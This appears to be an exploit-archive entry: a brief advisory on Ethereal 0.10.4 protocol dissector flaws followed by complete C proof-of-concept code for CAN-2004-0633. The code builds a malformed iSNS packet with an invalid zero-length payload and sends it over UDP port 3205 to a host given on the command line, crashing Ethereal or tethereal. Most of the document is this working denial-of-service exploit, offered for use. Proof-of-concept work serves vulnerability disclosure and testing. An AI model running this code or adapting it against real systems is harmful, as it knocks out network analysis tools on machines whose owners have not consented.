source: http://www.securityfocus.com/bid/10672/info  

Ethereal 0.10.5 has been released to address multiple vulnerabilities, including an iSNS protocol dissector vulnerability, a SMB protocol dissector vulnerability, and a SNMP protocol dissector vulnerability. These issues are due to a failure of the application to properly handle malformed packets.

Successful exploitation of these issues will allow an attacker to cause a denial of service condition in the affected application, it has also been reported that these issues may facilitate arbitrary code execution.

/*
 * Ethereal network protocol analyzer
 * iSNS Dissector zero-length payload
 * denial of service vulnerability
 * proof of concept code
 * version 1.0 (Aug 05 2004)
 * CVE ID: CAN-2004-0633
 *
 * by Remi Denis-Courmont < exploit at simphalampin dot com >
 *   http://www.simphalempin.com/dev/
 *
 * Vulnerable:
 *  - Ethereal v0.10.4
 *
 * Not vulnerable:
 *  - Ethereal v0.10.3 and earlier
 *  - Ethereal v0.10.5
 *
 * The code above should cause Ethereal (or tethereal -V) to abort.
 */


/*****************************************************************************
 * Copyright (C) 2004  Remi Denis-Courmont.  All rights reserved.            *
 *                                                                           *
 * Redistribution and use in source and binary forms, with or without        *
 * modification, are permitted provided that the following conditions        *
 * are met:                                                                  *
 * 1. Redistributions of source code must retain the above copyright notice, *
 *    this list of conditions and the following disclaimer.                  *
 * 2. Redistribution in binary form must reproduce the above copyright       *
 *    notice, this list of conditions and the following disclaimer in the    *
 *    documentation and/or other materials provided with the distribution.   *
 *                                                                           *
 * The author's liability shall not be incurred as a result of loss of due   *
 * the total or partial failure to fulfill anyone's obligations and direct   *
 * or consequential loss due to the software's use or performance.           *
 *                                                                           *
 * The current situation as regards scientific and technical know-how at the *
 * time when this software was distributed did not enable all possible uses  *
 * to be tested and verified, nor for the presence of any or all faults to   *
 * be detected. In this respect, people's attention is drawn to the risks    *
 * associated with loading, using, modifying and/or developing and           *
 * reproducing this software.                                                *
 * The user shall be responsible for verifying, by any or all means, the     *
 * software's suitability for its requirements, its due and proper           *
 * functioning, and for ensuring that it shall not cause damage to either    *
 * persons or property.                                                      *
 *                                                                           *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR      *
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES *
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.   *
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,          *
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT  *
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, *
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY     *
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT       *
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF  *
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.         *
 *                                                                           *
 * The author does not either expressly or tacitly warrant that this         *
 * software does not infringe any or all third party intellectual right      *
 * relating to a patent, software or to any or all other property right.     *
 * Moreaver, the author shall not hold someone harmless against any or all   *
 * proceedings for infringement that may be instituted in respect of the     *
 * use, modification and redistrbution of this software.                     *
 *****************************************************************************/


#include <string.h>
#include <stdio.h>

#ifndef WIN32
# include <sys/types.h>
# include <unistd.h>
# include <sys/socket.h>
# include <netdb.h>
#else
# include <winsock2.h>
# include <ws2tcpip.h>

# define close( fd ) closesocket_clean (fd)
# define perror( str ) (void)fprintf (stderr, "%s: Winsock error %d\n", \
                                str, WSAGetLastError ())

# undef gai_strerror
# define gai_strerror( i ) gai_strerror_does_not_link (i)
static const char *
gai_strerror_does_not_link (int errval)
{
        static char buf[32];

        sprintf (buf, "Winsock error %d", errval);
        return buf;
}

/* Winsock has the foolish habit of resetting error value to zero */
static int closesocket_clean (int fd)
{
        int errval, retval;

        errval = WSAGetLastError ();
        retval = closesocket (fd);
        if (retval == 0)
                WSASetLastError (errval);

        return retval;
}
#endif

static const char packet[] =
        /* iSNS header */
        "\x00\x01" /* Version */
        "\x00\x01" /* Function ID */
        "\x00\x1c" /* Length */
        "\x04\x00" /* Flags: First PDU */
        "\x00\x00" /* Transaction ID */
        "\x00\x00" /* Sequence ID */

        /* iSNS payload */
        "\x00\x00\x00\x03"
        "\x00\x00\x00\x00" /* Length (invalid) */
;


static int
proof (const char *target)
{
        int fd;
        struct addrinfo *res, *ptr, hints;

        memset (&hints, 0, sizeof (hints));
        hints.ai_socktype = SOCK_DGRAM;
        /* 'd work with TCP too, but UDP is much more straight-forward */

        fd = getaddrinfo (target, "3205", &hints, &res);
        if (fd)
        {
                fprintf (stderr, "%s: %s\n", target, gai_strerror (fd));
                return -1;
        }

        fd = -1;

        for (ptr = res; ptr != NULL && fd == -1; ptr = ptr->ai_next)
        {
                fd = socket (ptr->ai_family, ptr->ai_socktype,
                                ptr->ai_protocol);
                if (fd == -1)
                        continue;

                if (connect (fd, ptr->ai_addr, ptr->ai_addrlen))
                {
                        close (fd);
                        fd = -1;
                }
        }

        freeaddrinfo (res);

        if (fd == -1)
                perror (target);
        else
        {
                size_t len;

                len = sizeof (packet) - 1;
                if (send (fd, packet, len, 0) == len)
                {
                        puts ("Packet sent!");
                        close (fd);
                        return 0;
                }
                perror ("Packet sending error");
                close (fd);
        }

        return -1;
}


static int
usage (const char *path)
{
        fprintf (stderr, "Usage: %s <hostname/IP>\n", path);
        return 2;
}


int
main (int argc, char *argv[])
{
        int retval;

        puts ("Ethereal iSNS dissector zero-length vulnerability\n"
                "proof of concept code\n"
                "Copyright (C) 2004 Remi Denis-Courmont "
                "<\x65\x78\x70\x6c\x6f\x69\x74\x40\x73\x69\x6d\x70"
                "\x68\x61\x6c\x65\x6d\x70\x69\x6e\x2e\x63\x6f\x6d>\n");

#ifdef WIN32
        WSADATA wsaData;

        if (WSAStartup (0x202, &wsaData) || wsaData.wVersion != 0x202)
        {
                fputs ("Winsock version mismatch!\n", stderr);
                return 2;
        }
#endif

        if (argc != 2)
                return usage (argv[0]);

        retval = proof (argv[1]) ? 1 : 0;
#ifdef WIN32
        WSACleanup ();
#endif
        return retval;
}